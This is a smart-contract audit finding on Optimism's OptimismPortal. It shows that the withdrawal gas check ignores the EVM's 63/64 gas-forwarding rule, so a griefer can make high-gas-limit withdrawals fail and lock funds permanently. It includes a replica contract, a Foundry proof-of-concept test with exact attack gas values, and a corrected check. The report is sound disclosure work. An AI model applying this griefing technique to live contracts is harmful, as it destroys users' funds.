obront

high

# Withdrawals with high gas limits can be bricked by a malicious user, permanently locking funds

## Summary

Transactions to execute a withdrawal from the Optimism Portal require the caller to send enough gas to cover `gasLimit` specified by the withdrawer. 

Because the EVM limits the total gas forwarded on to 63/64ths of the total `gasleft()` (and silently reduces it to this value if we try to send more) there are situations where transactions with high gas limits will be vulnerable to being reverted.

Because there are no replays on this contract, the result is that a malicious user can call `finalizeWithdrawalTransaction()` with a precise amount of gas, cause the withdrawer’s withdrawal to fail, and permanently lock their funds.

## Vulnerability Detail

Withdrawals can be withdrawn from L2's `L2ToL1MessagePasser` contract to L1's `OptimismPortal` contract. This is a less "user-friendly" withdrawal path, presumably for users who know what they are doing. 

One of the quirks of the `OptimismPortal` is that there is no replaying of transactions. If a transaction fails, it will simply fail, and all ETH associated with it will remain in the `OptimismPortal` contract. Users have been warned of this and understand the risks, so Optimism takes no responsibility for user error.

In order to ensure that failed transactions can only happen at the fault of the user, the contract implements a check to ensure that the gasLimit is sufficient:

```solidity
require(
    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,
    "OptimismPortal: insufficient gas to finalize withdrawal"
);
```

When the transaction is executed, the contract requests to send along all the remaining gas, minus the hardcoded `FINALIZE_GAS_BUFFER` for actions after the call. The goal is that this will ensure that the amount of gas forwarded on is at least the gas limit specified by the user.

Optimism is aware of the importance of this property being correct when they write in the comments:

> “We want to maintain the property that the amount of gas supplied to the call to the target contract is at least the gas limit specified by the user. We can do this by enforcing that, at this point in time, we still have gaslimit + buffer gas available.”


The issue is that the EVM specifies the maximum gas that can be sent to an external call as 63/64ths of the `gasleft()`. For very large gas limits, this 1/64th that remains could be greater than the hardcoded FINALIZE_GAS_BUFFER value. In this case, less gas would be forwarded along than was directed by the contract.

Here is a quick overview of the math:

- We need X gas to be sent as a part of the call.
- This means we need `X * 64 / 63` gas to be available at the time the function is called.
- However, the only check is that we have `X + 20_000` gas a few operations prior to the call (which guarantees that we have `X + 14878` at the time of the call).
- For any situation where `X / 64 > 14878` (in other words, when the amount of gas sent is greater than `952_192`), the caller is able to send an amount of gas that passes the check, but doesn't forward the required amount on in the call.

## Impact

For any withdrawal with a gas limit of at least 952,192, a malicious user can call `finalizeWithdrawalTransaction()` with an amount of gas that will pass the checks, but will end up forwarding along less gas than was specified by the user.

The result is that the withdrawing user can have their funds permanently locked in the `OptimismPortal` contract.

## Proof of Concept

To test this behavior in a sandboxed environment, you can copy the following proof of concept.

Here are three simple contracts that replicate the behavior of the Portal, as well as an external contract that uses a predefined amount of gas.

(Note that we added 5122 to the gas included in the call to correct for the other bug we submitted, as this issue remains even when the other bug is patched.)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

library SafeCall {
    /**
     * @notice Perform a low level call without copying any returndata
     *
     * @param _target   Address to call
     * @param _gas      Amount of gas to pass to the call
     * @param _value    Amount of value to pass to the call
     * @param _calldata Calldata to pass to the call
     */
    function call(
        address _target,
        uint256 _gas,
        uint256 _value,
        bytes memory _calldata
    ) internal returns (bool) {
        bool _success;
        assembly {
            _success := call(
                _gas, // gas
                _target, // recipient
                _value, // ether value
                add(_calldata, 0x20), // inloc
                mload(_calldata), // inlen
                0, // outloc
                0 // outlen
            )
        }
        return _success;
    }
}

contract GasUser {
    uint[] public s;

    function store(uint i) public {
        for (uint j = 0; j < i; j++) {
            s.push(1);
        }
    }
}

contract Portal {
    address l2Sender;

    struct Transaction {
        uint gasLimit;
        address sender;
        address target;
        uint value;
        bytes data;
    }

    constructor(address _l2Sender) {
        l2Sender = _l2Sender;
    }

    function execute(Transaction memory _tx) public {
        require(
            gasleft() >= _tx.gasLimit + 20000,
            "OptimismPortal: insufficient gas to finalize withdrawal"
        );

        // Set the l2Sender so contracts know who triggered this withdrawal on L2.
        l2Sender = _tx.sender;

        // Trigger the call to the target contract. We use SafeCall because we don't
        // care about the returndata and we don't want target contracts to be able to force this
        // call to run out of gas via a returndata bomb.
        bool success = SafeCall.call(
            _tx.target,
            gasleft() - 20000 + 5122, // fix for other bug
            _tx.value,
            _tx.data
        );
    }
}
```

Here is a Foundry test that calls the Portal with various gas values to expose this vulnerability:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Portal.sol";

contract PortalGasTest is Test {
    Portal public c;
    GasUser public gu;

    function setUp() public {
        c = new Portal(0x000000000000000000000000000000000000dEaD);
        gu = new GasUser();
    }

    function testGasLimitForGU() public {
        gu.store{gas: 11_245_655}(500);
        assert(gu.s(499) == 1);
    }

    function _executePortalWithGivenGas(uint gas) public {
        c.execute{gas: gas}(Portal.Transaction({
            gasLimit: 11_245_655,
            sender: address(69),
            target: address(gu),
            value: 0,
            data: abi.encodeWithSignature("store(uint256)", 500)
        }));
    }

    function testPortalCatchesGasTooSmall() public {
        vm.expectRevert(bytes("OptimismPortal: insufficient gas to finalize withdrawal"));
        _executePortalWithGivenGas(11_266_734);
    }

    function testPortalSucceedsWithEnoughGas() public {
        _executePortalWithGivenGas(11_433_180);
        assert(gu.s(499) == 1);
    }

    function testPortalBugWithInBetweenGasLow() public {
        _executePortalWithGivenGas(11_266_735);
        
        // It now reverts because the array has a length of 0.
        vm.expectRevert();
        gu.s(0);
    }

    function testPortalBugWithInBetweenGasHigh() public {
        _executePortalWithGivenGas(11_433_179);
        
        // It now reverts because the array has a length of 0.
        vm.expectRevert();
        gu.s(0);
    }
}
```
As you can see:
- We verify that the call to the target contract succeeds with 11,245,655 gas, and set that as gasLimit for all tests. This is the `X` from our formula above.
- This means that we need `11_245_655 * 64 / 63 = 11_424_157` gas available at the time the call is made.
- The test uses `9023` gas before it makes our call, so we can see that if we send `11_424_157 + 9_023 = 11_433_180` gas, the test passes.
- Similarly, if we send `11_266_734` gas, the total gas will be small enough to fail the require check.
- But in the sweet spot between these values, we have enough gas to pass the require check, but when we get to the call, the amount of gas requested is more than 63/64ths of the total, so the EVM sends less than we asked for. As a result, the transaction fails.

## Code Snippet

https://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L310-L329

https://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/libraries/SafeCall.sol#L17-L36

## Tool used

Manual Review

## Recommendation

Change the check to account for this 63/64 rule:

```solidity
require(
    gasleft() >= (_tx.gasLimit + FINALIZE_GAS_BUFFER) * 64 / 63,
    "OptimismPortal: insufficient gas to finalize withdrawal"
);
```